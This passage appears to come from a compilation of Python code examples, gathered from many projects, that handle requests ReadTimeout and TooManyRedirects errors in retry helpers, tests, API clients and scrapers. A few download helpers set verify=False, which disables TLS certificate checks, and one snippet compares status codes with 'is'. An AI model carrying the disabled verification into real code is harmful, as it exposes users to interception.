        Wait until UI Element exists or gone

        Args:
            timeout (float): wait element timeout

        Example:
            d(text="Clock").wait()
            d(text="Settings").wait("gone") # wait until it's gone
        """
        if timeout is None:
            timeout = self.wait_timeout
        http_wait = timeout + 10
        if exists:
            try:
                return self.jsonrpc.waitForExists(self.selector,
                                                  int(timeout * 1000),
                                                  http_timeout=http_wait)
            except requests.ReadTimeout as e:
                warnings.warn("waitForExists readTimeout: %s" % e,
                              RuntimeWarning)
                return self.exists()
        else:
            try:
                return self.jsonrpc.waitUntilGone(self.selector,
                                                  int(timeout * 1000),
                                                  http_timeout=http_wait)
            except requests.ReadTimeout as e:
                warnings.warn("waitForExists readTimeout: %s" % e,
                              RuntimeWarning)
                return not self.exists() 
**************************************
def _get_member_by_mid(self, mid: int) -> Optional[dict]:
        """
        根据用户id获取其信息
        :param mid: B站用户id
        :return: 用户详情 or None
        """
        get_params = {
            'mid': mid,
            'jsonp': 'jsonp'
        }
        try:
            res_json = requests.get(API_MEMBER_INFO, params=get_params, timeout=WAIT_MAX, proxies=self.cur_proxy,
                                    headers=self.headers).json()
        except ConnectTimeout as e:
            print(f'获取用户id: {mid} 详情失败: 请求接口超时, 当前代理:{self.cur_proxy["https"]}')
            raise RequestException(str(e))
        except ReadTimeout as e:
            print(f'获取用户id: {mid} 详情失败: 接口读取超时, 当前代理:{self.cur_proxy["https"]}')
            raise RequestException(str(e))
        except ValueError as e:
            # 解析json失败基本上就是ip被封了
            print(f'获取用户id: {mid} 详情失败: 解析json出错, 当前代理:{self.cur_proxy["https"]}')
            raise RequestException(str(e))
        except ProxyError as e:
            print(f'获取用户id: {mid} 详情失败: 连接代理失败, 当前代理:{self.cur_proxy["https"]}')
            raise RequestException(str(e))
        except requests.ConnectionError as e:
            # 可以断定就是代理IP地址无效
            print(f'获取用户id: {mid} 详情失败: 连接错误, 当前代理:{self.cur_proxy["https"]}')
            raise RequestException(str(e))
        except ChunkedEncodingError as e:
            print(f'获取用户id: {mid} 详情失败: 远程主机强迫关闭了一个现有的连接, 当前代理:{self.cur_proxy["https"]}')
            raise RequestException(str(e))
        else:
            if res_json['code'] == -404:
                print(f'找不到用户mid:{mid}')
                raise UserNotFoundException(f'找不到用户mid:{mid}')
            if 'data' in res_json:
                return res_json['data']
            print(f'获取用户id: {mid} 详情失败: data字段不存在!')
        return 
**************************************
def parse(self):
        if not self._has_timeout():
            await self._read_header()
        else:
            async with timeout_after(self.timeout) as is_timeout:
                await self._read_header()
            if is_timeout:
                raise ReadTimeoutError()
        if not self.headers_completed:
            raise ProtocolError('incomplete response headers')
        body_stream = self.body_stream()
        decoder = self._get_decoder()
        if decoder:
            body_stream = _decompress(body_stream, decoder)

        def stream(chunk_size=DEFAULT_BUFFER_SIZE):
            self._set_current_buffer_size(chunk_size)
            return body_stream

        environ = dict(
            version=self.version,
            status=self.status,
            reason=self.reason,
            keep_alive=self.keep_alive,
            headers=self.headers,
            stream=stream,
        )
        return Response(**environ) 
**************************************
def body_stream(self):
        if not self._has_timeout():
            async for chunk in self._body_stream_impl():
                yield chunk
        else:
            async with timeout_after(self.timeout) as is_timeout:
                async for chunk in self._body_stream_impl():
                    yield chunk
            if is_timeout:
                raise ReadTimeoutError() 
**************************************
def _run(self, *args, **kwargs):
        url = self._url_template.format(
            protocol=self._runner.protocol,
            target_host=self._target_host,
            **self._url_params,
        )
        log.debug('Requesting', url=url, method=self._method)
        try:
            resp = self._runner.session.request(
                method=self._method,
                url=url,
                json=self._request_params,
                timeout=self._timeout,
            )
        except (ReadTimeout, ConnectTimeout) as ex:
            raise TransferFailed(
                f"Transfer didn't complete within timeout of {self._timeout}",
            ) from ex
        except RequestException as ex:
            raise RESTAPIError(f'Error performing REST-API call: {self._name}') from ex
        if not self._http_status_re.match(str(resp.status_code)):
            raise RESTAPIStatusMismatchError(
                f'HTTP status code "{resp.status_code}" while fetching {url}. '
                f'Expected {self._expected_http_status}: {resp.text}',
            )
        try:
            if resp.content == b'':
                # Allow empty responses
                response_dict = {}
            else:
                response_dict = resp.json()
            return self._process_response(response_dict)
        except (ValueError, UnicodeDecodeError) as ex:
            raise RESTAPIError(
                f'Error decoding response for url {url}: {resp.status_code} {resp.text}',
            ) from ex 
**************************************
def need_retry(exception):
    """
    need to retry
    :param exception:
    :return:
    """
    result = isinstance(exception, (requests.ConnectionError, requests.ReadTimeout))
    if result:
        print('Exception', type(exception), 'occurred, retrying...')
    return result 
**************************************
def fetch(url, **kwargs):
    """
    warp _fetch method
    :param url: fetch url
    :param kwargs: other requests params
    :return: result of _fetch
    """

    @retry(stop_max_attempt_number=retry_max_number, wait_random_min=retry_min_random_wait,
           wait_random_max=retry_max_random_wait, retry_on_exception=need_retry)
    def _fetch(url, **kwargs):
        """
        fetch api response
        :param url: fetch url
        :param kwargs: other requests params
        :return: json of response
        """
        response = requests.get(url, **kwargs)
        if response.status_code != 200:
            raise requests.ConnectionError('Expected status code 200, but got {}'.format(response.status_code))
        return response.json() if response.content else {}

    try:
        result = _fetch(url, **kwargs)
        return result
    # give up retrying
    except (requests.ConnectionError, requests.ReadTimeout):
        return {} 
**************************************
def crawl():
    wbus = WeiboUser.objects.all()
    for wbu in wbus:
        logging.info("Begin crawling {}".format(wbu.name))
        try:
            crawl_wb(wbu, True)
        except requests.ReadTimeout as e:
            logging.error("crawling {} timeout".format(wbu.name))
        except Exception as e:
            traceback.print_exc()
            logging.error(e)
        time.sleep(1)
        logging.info("Crawl {} finish".format(wbu.name)) 
**************************************
def need_retry(exception):
    """
    need to retry
    :param exception:
    :return:
    """
    result = isinstance(exception, (requests.ConnectionError, requests.ReadTimeout))
    if result:
        print('Exception', type(exception), 'occurred, retrying...')
    return result 
**************************************
def fetch(url, **kwargs):
    """
    warp _fetch method
    :param url: fetch url
    :param kwargs: other requests params
    :return: result of _fetch
    """
    
    @retry(stop_max_attempt_number=retry_max_number, wait_random_min=retry_min_random_wait,
           wait_random_max=retry_max_random_wait, retry_on_exception=need_retry)
    def _fetch(url, **kwargs):
        """
        fetch api response
        :param url: fetch url
        :param kwargs: other requests params
        :return: json of response
        """
        kwargs.update({'verify': False})
        kwargs.update({'timeout': fetch_timeout})
        response = requests.get(url, **kwargs)
        if response.status_code != 200:
            raise requests.ConnectionError('Expected status code 200, but got {}'.format(response.status_code))
        return response.json()
    
    try:
        result = _fetch(url, **kwargs)
        return result
    # give up retrying
    except (requests.ConnectionError, requests.ReadTimeout):
        return {} 
**************************************
def _http_request_with_retry(self, *args, **kwargs):
        def is_retryable(error):
            now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            print('{0} {1}'.format(now, repr(error)))

            def is_retryable_status_code(error):
                if not isinstance(error, requests.HTTPError):
                    return False
                if error.response.status_code == 409:
                    return True
                else:
                    return not (400 <= error.response.status_code <= 499)

            return is_retryable_status_code(error) or isinstance(
                error, (requests.ConnectionError, requests.ReadTimeout)
            )

        if 'retry' in kwargs:
            retry = kwargs['retry'] | retry_if_exception(is_retryable)
            del kwargs['retry']
        else:
            retry = retry_if_exception(is_retryable)
        if 'before' in kwargs:
            before = kwargs['before']
            del kwargs['before']
        else:
            before = None

        kwargs['timeout'] = self.individual_request_timeout
        return self._http_request.retry_with(
            retry=retry,
            before=before,
            wait=wait_exponential(
                multiplier=self.retry_multiplier, max=self.retry_max_interval
            ),
            stop=(
                stop_after_delay(self.retry_timeout)
                | stop_after_attempt(self.retry_max_tries)
            ),
        )(self, *args, **kwargs) 
**************************************
def test_wait_for_valid_status_retries_on_read_timeout_error(self, requests_mock):
        envelope_url = (
            'https://api.ingest.dev.data.humancellatlas.org/submissionEnvelopes/abcde'
        )

        def _request_callback(request, context):
            context.status_code = 500
            raise requests.ReadTimeout

        requests_mock.get(envelope_url, json=_request_callback)
        with pytest.raises(requests.ReadTimeout), HttpRequestsManager():
            confirm_submission.wait_for_valid_status(envelope_url, HttpRequests())
        assert requests_mock.call_count == 3 
**************************************
def test_run_retry_if_read_timeout_error_occurs(self, requests_mock, test_data):
        def _request_callback(request, context):
            context.status_code = 500
            raise requests.ReadTimeout

        requests_mock.get(test_data.envelope_url, json=_request_callback)
        with pytest.raises(requests.ReadTimeout), HttpRequestsManager():
            getter.run(test_data.envelope_url, HttpRequests())
        assert requests_mock.call_count == 3 
**************************************
def test_get_envelope_url_retries_on_read_timeout_error(
        self, requests_mock, test_data
    ):
        submit_url = 'https://api.ingest.dev.data.humancellatlas.org/'

        def _request_callback(request, context):
            context.status_code = 500
            raise requests.ReadTimeout

        requests_mock.get(submit_url, json=_request_callback)
        with pytest.raises(requests.ReadTimeout), HttpRequestsManager():
            submit.get_envelope_url(submit_url, test_data.headers, HttpRequests())
        assert requests_mock.call_count == 3 
**************************************
def test_read_timeout_handled_when_getting_container(self):
        with mock.patch.object(self.manager._containers_client, "get",
                               side_effect=requests.ReadTimeout):
            with self.assertRaises(DockerContainerClientTimeout):
                self.manager.get_url(self.container_name) 
**************************************
def test_requests_webhook_runner_handles_timeout_as_retry():
    def raise_retry(*args, **kwargs):
        raise requests.ReadTimeout()

    httpretty.register_uri(
        httpretty.POST,
        'http://example.com/',
        status=410,
        body=raise_retry,
    )
    runner = RequestsWebhookRunner()
    result = runner('http://example.com', 'application/json', b'{}', '')
    assert result == WebhookResult.RETRY 
**************************************
def test_block_service(self, app, cfg, url):
        url = 'http://{}/albums'.format(url)
        assert get(url).status_code == 200
        assert app.block_services([cfg['testing']['db-instance-name']], direction='both') == 0

        try:
            timeout_occurred = False
            get(url)
        except ReadTimeout:
            timeout_occurred = True

        app.unblock_services()
        assert get(url).status_code == 200
        assert timeout_occurred 
**************************************
def recv(self):
        if not self.timeout or self.timeout <= 0:
            return await self._sock.recv(self.current_buffer_size)
        else:
            try:
                return await timeout_after(
                    self.timeout,
                    self._sock.recv(self.current_buffer_size)
                )
            except TaskTimeout as ex:
                raise ReadTimeoutError(str(ex)) from None 
**************************************
def search(self, user_id, pattern, page=1):
        for i, mirror in enumerate(self.mirrors):
            logger.info("Fetching torrents from " + mirror)
            if not self.search_urls[i]:
                try:
                    self.search_urls[i] = self.get_search_url(mirror)
                except (requests.exceptions.SSLError, TypeError) as error:
                    logger.error(f"Error when requesting home page of {mirror}")
                    logger.opt(exception=True).trace(error)
                    continue
                except (requests.ConnectTimeout, requests.ReadTimeout):
                    logger.info("Timeout")
                    continue
            search_url = self.search_urls[i]

            page_param = "&page=" + str(page - 1)
            try:
                html_page = requests.get(search_url + f"?q={pattern}{page_param}", timeout=5)
            except (requests.ConnectTimeout, requests.ReadTimeout):
                logger.info("Timeout")
                continue

            soup = BeautifulSoup(html_page.text, features="html.parser")

            torrents = []
            rows = soup.find_all("tr")[1:]

            for row in rows:
                link = row.find("a", class_="detLink")
                seeders, leechers = [int(td.text) for td in row.find_all("td")[2:]]
                extra = row.font.text.split(", ")

                torrents.append(
                    Torrent(
                        title=link.text,
                        magnet=row.find("a", href=re.compile(r"^magnet:\?"))["href"],
                        url=mirror + "/" + link["href"].lstrip("/"),
                        seeders=seeders,
                        leechers=leechers,
                        date=extra[0][len("Uploaded ") :],
                        size=extra[1][len("Size ") :],
                        uploader=extra[2][len("ULed by ") :],
                    )
                )

            if torrents:
                return Search(user_id, mirror, pattern, torrents, [page])
            else:
                logger.info("No results")
                pass

        raise LookupError 
**************************************
def check(self, instance):
        config = self.get_instance_config(instance)

        # Check ES version for this instance and define parameters
        # (URLs and metrics) accordingly
        version = self._get_es_version(config)

        health_url, stats_url, pshard_stats_url, pending_tasks_url, stats_metrics, \
            pshard_stats_metrics = self._define_params(version, config.cluster_stats)

        # Load stats data.
        # This must happen before other URL processing as the cluster name
        # is retreived here, and added to the tag list.

        stats_url = urlparse.urljoin(config.url, stats_url)
        stats_data = self._get_data(stats_url, config)
        if stats_data['cluster_name']:
            # retreive the cluster name from the data, and append it to the
            # master tag list.
            config.tags.append("cluster_name:{}".format(stats_data['cluster_name']))
        self._process_stats_data(stats_data, stats_metrics, config)

        # Load clusterwise data
        # Note: this is a cluster-wide query, might TO.
        if config.pshard_stats:
            send_sc = bubble_ex = not config.pshard_graceful_to
            pshard_stats_url = urlparse.urljoin(config.url, pshard_stats_url)
            try:
                pshard_stats_data = self._get_data(pshard_stats_url, config, send_sc=send_sc)
                self._process_pshard_stats_data(pshard_stats_data, config, pshard_stats_metrics)
            except requests.ReadTimeout as e:
                if bubble_ex:
                    raise
                self.log.warning("Timed out reading pshard-stats from servers (%s) - stats will be missing", e)


        # Load the health data.
        health_url = urlparse.urljoin(config.url, health_url)
        health_data = self._get_data(health_url, config)
        self._process_health_data(health_data, config)

        if config.pending_task_stats:
            # Load the pending_tasks data.
            pending_tasks_url = urlparse.urljoin(config.url, pending_tasks_url)
            pending_tasks_data = self._get_data(pending_tasks_url, config)
            self._process_pending_tasks_data(pending_tasks_data, config)

        # If we're here we did not have any ES conn issues
        self.service_check(
            self.SERVICE_CHECK_CONNECT_NAME,
            AgentCheck.OK,
            tags=config.service_check_tags
        ) 
**************************************
def watch(self, path):
        url = self._base_url + path
        resource_version = None
        header = {}
        timeouts = (CONF.kubernetes.watch_connection_timeout,
                    CONF.kubernetes.watch_read_timeout)
        if self.token:
            header.update({'Authorization': 'Bearer %s' % self.token})

        while True:
            try:
                params = {'watch': 'true'}
                if resource_version:
                    params['resourceVersion'] = resource_version
                with contextlib.closing(
                        self.session.get(
                            url, params=params, stream=True, cert=self.cert,
                            verify=self.verify_server, headers=header,
                            timeout=timeouts)) as response:
                    if not response.ok:
                        raise exc.K8sClientException(response.text)
                    for line in response.iter_lines():
                        line = line.decode('utf-8').strip()
                        if line:
                            line_dict = jsonutils.loads(line)
                            yield line_dict
                            # Saving the resourceVersion in case of a restart.
                            # At this point it's safely passed to handler.
                            m = line_dict.get('object', {}).get('metadata', {})
                            resource_version = m.get('resourceVersion', None)
            except (requests.ReadTimeout, ssl.SSLError) as e:
                if isinstance(e, ssl.SSLError) and e.args != ('timed out',):
                    raise

                LOG.warning('%ds without data received from watching %s. '
                            'Retrying the connection with resourceVersion=%s.',
                            timeouts[1], path, params.get('resourceVersion'))
            except requests.exceptions.ChunkedEncodingError:
                LOG.warning("Connection to %s closed when watching. This "
                            "mostly happens when Octavia's Amphora closes "
                            "connection due to lack of activity for 50s. "
                            "Since Rocky Octavia this is configurable and "
                            "should be set to at least 20m, so check timeouts "
                            "on Kubernetes API LB listener. Restarting "
                            "connection with resourceVersion=%s.", path,
                            params.get('resourceVersion')) 
**************************************
def load_new_items():
    items = {}
    for feed in feeds:
        print(feed)
        try:
            resp = requests.get(feed['url'], timeout=10.0)
        except requests.ReadTimeout:
            print("Timeout when reading RSS %s", feed)
            continue

        content = BytesIO(resp.content)
        news_feed = feedparser.parse(content)

        keys = []
        id_dedup = {}
        epoch_time = int(time.time()) + 2592000 * 36 # 3 years
        for entry in news_feed['entries']:
            title = entry['title']
            summary = clean_text(entry['summary'])
            dt = parse_date(entry['published'])

            if len(summary) <= 0:
                summary = title

            id = feed['source'] + " " + title.lower()
            if id in id_dedup:
                continue

            id_dedup[id] = id
            keys.append({'id': id})
            items[id] = {
                'id': id,
                'title': title,
                '@timestamp': dt,
                'source': feed['source'],
                'category': feed['category'],
                'summary': summary,
                'expire': epoch_time,
                'message': entry['title_detail']['value'] + ': ' +  entry['link']
            }


            if len(keys) == 20:
                items = check_items(keys, items)
                keys = []

        if len(keys) != 20:
            items = check_items(keys, items)

    dynamodb_items = []
    for __, value in items.items():
        dynamodb_items.append({'PutRequest': {'Item': value}})
        if len(dynamodb_items) == 20:
            commit_items(dynamodb_items)
            dynamodb_items = []
    commit_items(dynamodb_items)
    return items 
**************************************
def watch(self, path):
        url = self._base_url + path
        resource_version = None
        header = {}
        timeouts = (CONF.kubernetes.watch_connection_timeout,
                    CONF.kubernetes.watch_read_timeout)
        if self.token:
            header.update({'Authorization': 'Bearer %s' % self.token})

        while True:
            try:
                params = {'watch': 'true'}
                if resource_version:
                    params['resourceVersion'] = resource_version
                with contextlib.closing(
                        self.session.get(
                            url, params=params, stream=True, cert=self.cert,
                            verify=self.verify_server, headers=header,
                            timeout=timeouts)) as response:
                    if not response.ok:
                        raise exc.K8sClientException(response.text)
                    for line in response.iter_lines():
                        line = line.decode('utf-8').strip()
                        if line:
                            line_dict = jsonutils.loads(line)
                            yield line_dict
                            # Saving the resourceVersion in case of a restart.
                            # At this point it's safely passed to handler.
                            m = line_dict.get('object', {}).get('metadata', {})
                            resource_version = m.get('resourceVersion', None)
            except (requests.ReadTimeout, ssl.SSLError) as e:
                if isinstance(e, ssl.SSLError) and e.args != ('timed out',):
                    raise

                LOG.warning('%ds without data received from watching %s. '
                            'Retrying the connection with resourceVersion=%s.',
                            timeouts[1], path, params.get('resourceVersion'))
            except requests.exceptions.ChunkedEncodingError:
                LOG.warning("Connection to %s closed when watching. This "
                            "mostly happens when Octavia's Amphora closes "
                            "connection due to lack of activity for 50s. "
                            "Since Rocky Octavia this is configurable and "
                            "should be set to at least 20m, so check timeouts "
                            "on Kubernetes API LB listener. Restarting "
                            "connection with resourceVersion=%s.", path,
                            params.get('resourceVersion')) 
**************************************
def execute(self, method, *args):
		payload = dumps(args, methodname=method, allow_none=True)
		body = gzip.compress(payload.encode('utf8'))
		try:
			res = await self.loop.run_in_executor(None, self.__request, body)
			data, _ = loads(res.text, use_datetime=True)
			if isinstance(data, (tuple, list)) and len(data) > 0 and len(data[0]) > 0:
				if isinstance(data[0][0], dict) and 'faultCode' in data[0][0]:
					raise DedimaniaFault(faultCode=data[0][0]['faultCode'], faultString=data[0][0]['faultString'])
				self.retries = 0
				return data[0]
			raise DedimaniaTransportException('Invalid response from dedimania!')
		except (ConnectionError, ReadTimeout, ConnectionRefusedError) as e:
			raise DedimaniaTransportException(e) from e
		except ConnectTimeout as e:
			raise DedimaniaTransportException(e) from e
		except DedimaniaTransportException:
			# Try to setup new session.
			self.retries += 1
			if self.retries > 5:
				raise DedimaniaTransportException('Dedimania didn\'t gave the right answer after few retries!')
			self.client = requests.session()
			try:
				await self.authenticate()
				return await self.execute(method, *args)
			except Exception as e:
				logger.error('XML-RPC Fault retrieved from Dedimania: {}'.format(str(e)))
				handle_exception(e, __name__, 'execute')
				raise DedimaniaTransportException('Could not retrieve data from dedimania!')
		except DedimaniaFault as e:
			if 'Bad SessionId' in e.faultString or ('SessionId' in e.faultString and 'not found' in e.faultString):
				try:
					self.retries += 1
					if self.retries > 5:
						raise DedimaniaTransportException('Max retries reached for reauthenticating with dedimania!')

					# Save original session ID.
					original_session_id = '{}'.format(self.session_id)

					# Reauthenticate
					await self.authenticate()

					# Replace session_id in args.
					if len(args) > 0 and len(args[0]) > 0 and isinstance(args[0][0], dict) and 'params' in args[0][0]:
						new_params = list(args[0][0]['params'])
						if len(new_params) > 0 and isinstance(new_params[0], str) and new_params[0] == original_session_id:
							new_params[0] = self.session_id
							args[0][0]['params'] = tuple(new_params)

					# Try again.
					return await self.execute(method, *args)
				except:
					return
			logger.error('XML-RPC Fault retrieved from Dedimania: {}'.format(str(e)))
			handle_exception(e, __name__, 'execute', extra_data={
				'dedimania_retries': self.retries,
			})
			raise DedimaniaTransportException('Could not retrieve data from dedimania!') 

Python requests.TooManyRedirects() Examples

**************************************
def api_call_get(self, url, data=None):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.get(cf_api_url + url, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        return api_result 
**************************************
def api_call_post(self, url, data=None):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.post(cf_api_url + url, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        return api_result 
**************************************
def api_call_delete(self, uri, data='{}'):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.delete(cf_api_url + uri, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if not api_result['success']:
            raise self.APIError(api_result['errors'])
        return api_result 
**************************************
def api_call_patch(self, uri, data='{}'):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.patch(cf_api_url + uri, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        return api_result 
**************************************
def api_call_put(self, uri, data='{}'):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.put(cf_api_url + uri, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        elif api_result['errors']:
            raise self.APIError(str(api_result['errors']))
        return api_result

    ################################################################
    #  Zone (https://api.cloudflare.com/#zone)                     #
    ################################################################

    #  Get all zones 
**************************************
def titler(bot, event, irc, args):
    # Implementation taken from Eleos
    match = re.search(r"(?:https?://)(?:www\.)?([^\s]+)", " ".join(args))
    if match is not None:
        log.info(f'Fetching URL ({match.group(0)}) from user {event.source}')
        try:
            t, url = _get_title(match.group(0))
            title = "[{0!s}] - {1!s}".format(t, url)
        except requests.Timeout:
            title = '${RED}[timeout]${NORMAL}'
        except requests.TooManyRedirects:
            title = '${RED}[too many redirects]${NORMAL}'
        except Exception:
            title = '${RED}[error]${NORMAL}'
            print_error(irc, event)
        irc.reply(event, title) 
**************************************
def _fetch_status(self):
        """Fetch some basic status information from ACLSwitch.

        :return: Information in a dict, None if error.
        """
        print("Fetching status information...")
        try:
            resp = requests.get(self._URL_ACLSW)
        except requests.ConnectionError as err:
            print(cli_util.MSG_CON_ERR + str(err))
            return None
        except requests.HTTPError as err:
            print(cli_util.MSG_HTTP_ERR + str(err))
            return None
        except requests.Timeout as err:
            print(cli_util.MSG_TIMEOUT + str(err))
            return None
        except requests.TooManyRedirects as err:
            print(cli_util.MSG_REDIRECT_ERR + str(err))
            return None
        if resp.status_code != 200:
            print("Error fetching resource, HTTP {0} "
                  "returned.".format(resp.status_code))
            return None
        return resp.json() 
**************************************
def can_access(url):
    mod = 'can_access'
    answer = "U"
    response = None
    try:
        response = requests.get(url, timeout=5)
        answer = "SL"
    except:
        print (sys.exc_info()[0])

    """
    except requests.exceptions.ConnectionError as e:
        print e
    except requests.exceptions.Timeout as e:
        print e
    except requests.TooManyRedirects as e:
        print e
    except requests.exceptions.ChunkedEncodingError as e:
        print e
    except requests.exceptions.ContentDecodingError as e:
        print e
    except socket.error as e:
        print e
    """
    return answer, response, mod 
**************************************
def can_access(url):
    mod = 'can_access'
    answer = "U"
    response = None
    try:
        response = requests.get(url, timeout=5)
        current_page = (response.text, 'lxml')
        answer = "SL"
    except requests.exceptions.ConnectionError:
        print("ERROR: Page is inaccessible, return U and move to next case.")
    except requests.exceptions.Timeout as e:
        print e
    except requests.TooManyRedirects as e:
        print e
    except requests.exceptions.ChunkedEncodingError as e:
        print e
    except socket.error as e:
        print e
    return answer, response, mod 
**************************************
def get_response(self, link):
        print(f'GET {link}')

        try:
            response = requests.get(link)
        except (Timeout, TooManyRedirects, RequestException) as error:
            raise ConsumerException(f'OpenGov request failed: {error}')

        try:
            response.raise_for_status()
        except HTTPError as error:
            raise ConsumerException(f'OpenGov HTTP error: {error}')

        response_time = response.elapsed.total_seconds()
        print(f'Fetched response after {response_time}s')

        return response 
**************************************
def temp_login(session: requests.Session, username, password):
    # 优先使用cookie登录。如果cookie不行，则会使用用户名密码登录。这个函数只能返回两种结果，要么是密码错误所导致的fail Unionauth，要么是登录成功的界面。main本身不关心具体实现的细节.
    try:
        first_login_response = session.get('http://ipgw.neu.edu.cn/srun_cas.php?ac_id=1')
    except TooManyRedirects:  # cookie过期，学校会在first反复重定向。
        print("cookies are out of date, login with default username")
        session.cookies.clear()
        first_login_response = session.get('http://ipgw.neu.edu.cn/srun_cas.php?ac_id=1')
    first_login_result = distinguish_and_build(BeautifulSoup(first_login_response.text, "lxml"))
    if type(first_login_result) is SuccessPage:  # 第一遍就登录进去了。
        if first_login_result.status == 0:
            first_login_result.get_detailed_traffic_and_online_seconds(session)
        return first_login_result
    elif type(first_login_result) is UnionAuth:  # 返回统一认证，说明没有cookie或者cookie被清空。
        auth_login_result = first_login_result.login(username, password, session)
        if type(auth_login_result) is UnionAuth and auth_login_result.last_temp == 5:
            # 出现玄学问题，登录结果并不返回任何错误信息。这个问题的产生和错误的第三段cookie异常很有关系。解决此现象的方法只有一个，清除所有cookie，然后重新登录。
            print("cookies may be modified or too old, login with default username.")
            session.cookies.clear()
            return temp_login(session, username, password)
        else:
            return auth_login_result
    else:
        raise NameError("unknown response") 
**************************************
def download(url, file_path, tries=DEFAULT_TRIES, retry_delay=RETRY_DELAY):
    """
    Descarga un archivo a través del protocolo HTTP, en uno o más intentos.

    Args:
        url (str): URL (schema HTTP) del archivo a descargar.
        tries (int): Intentos a realizar (default: 3).
        retry_delay (int o float): Tiempo a esperar, en segundos, entre cada
            intento.
        try_timeout (int o float): Tiempo máximo a esperar por intento.
        proxies (dict): Proxies a utilizar. El diccionario debe contener los
            valores 'http' y 'https', cada uno asociados a la URL del proxy
            correspondiente.

    Returns:
        bytes: Contenido del archivo
    """
    timeout = 10
    for i in range(1, tries + 1):
        try:
            with requests.get(url, timeout=timeout ** i, stream=True,
                              verify=False) as r:
                r.raise_for_status()
                with open(file_path, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=8192):
                        if chunk:  # filter out keep-alive new chunks
                            f.write(chunk)

        except requests.TooManyRedirects as e:
            raise e
        except Exception as e:
            download_exception = e
            raise download_exception 
**************************************
def url_exists(url):

    try:
        response_code = requests.head(url).status_code
    except requests.ConnectionError:
        print("[Error] There were connection problems.")
        return False
    except requests.HTTPError:
        print("[Error] Http Error.")
        return False
    except requests.Timeout:
        print("[Error] Timeout Occurred.")
        return False
    except requests.TooManyRedirects:
        print("[Error] Too many redirects")
        return False
    except requests.RequestException:
        print("[Error] Generic exception")
        return False

    if response_code is 200:
        return True

    return False


# This function is used to check if all the links specified in the Dockerfile(s) are valid. 
**************************************
def _post_policy(self, rule_json):
        """Send a JSON object representing an policy domain to
        ACLSwitch for creation.

        :param rule_json: The JSON object to send.
        """
        try:
            resp = requests.post(self._url_policy, data=rule_json,
                                 headers={"Content-type":
                                          "application/json"})
        except requests.ConnectionError as err:
            print(cli_util.MSG_CON_ERR + str(err))
            return
        except requests.HTTPError as err:
            print(cli_util.MSG_HTTP_ERR + str(err))
            return
        except requests.Timeout as err:
            print(cli_util.MSG_TIMEOUT + str(err))
            return
        except requests.TooManyRedirects as err:
            print(cli_util.MSG_REDIRECT_ERR + str(err))
            return
        if resp.status_code == 500:
            print(resp.json()["critical"])
            return
        if resp.status_code != 200:
            print("Error creating resource, HTTP {0} "
                  "returned.".format(resp.status_code))
            return
        print(resp.json()["info"]) 
**************************************
def _delete_policy(self, rule_json):
        """Send a JSON object representing an policy domain to
        ACLSwitch for removal.

        :param rule_json: The JSON object to send.
        """
        try:
            resp = requests.delete(self._url_policy, data=rule_json,
                                   headers={"Content-type":
                                            "application/json"})
        except requests.ConnectionError as err:
            print(cli_util.MSG_CON_ERR + str(err))
            return
        except requests.HTTPError as err:
            print(cli_util.MSG_HTTP_ERR + str(err))
            return
        except requests.Timeout as err:
            print(cli_util.MSG_TIMEOUT + str(err))
            return
        except requests.TooManyRedirects as err:
            print(cli_util.MSG_REDIRECT_ERR + str(err))
            return
        if resp.status_code == 500:
            print(resp.json()["critical"])
            return
        if resp.status_code != 200:
            print("Error creating resource, HTTP {0} "
                  "returned.".format(resp.status_code))
            return
        print(resp.json()["info"]) 
**************************************
def _put_policy_assign(self, rule_json):
        """Send a JSON object representing an policy domain assignment
        to ACLSwitch.

        :param rule_json: The JSON object to send.
        """
        try:
            resp = requests.put(self._url_policy_assign, data=rule_json,
                                headers={"Content-type":
                                         "application/json"})
        except requests.ConnectionError as err:
            print(cli_util.MSG_CON_ERR + str(err))
            return
        except requests.HTTPError as err:
            print(cli_util.MSG_HTTP_ERR + str(err))
            return
        except requests.Timeout as err:
            print(cli_util.MSG_TIMEOUT + str(err))
            return
        except requests.TooManyRedirects as err:
            print(cli_util.MSG_REDIRECT_ERR + str(err))
            return
        if resp.status_code == 500:
            print(resp.json()["critical"])
            return
        if resp.status_code != 200:
            print("Error creating resource, HTTP {0} "
                  "returned.".format(resp.status_code))
            return
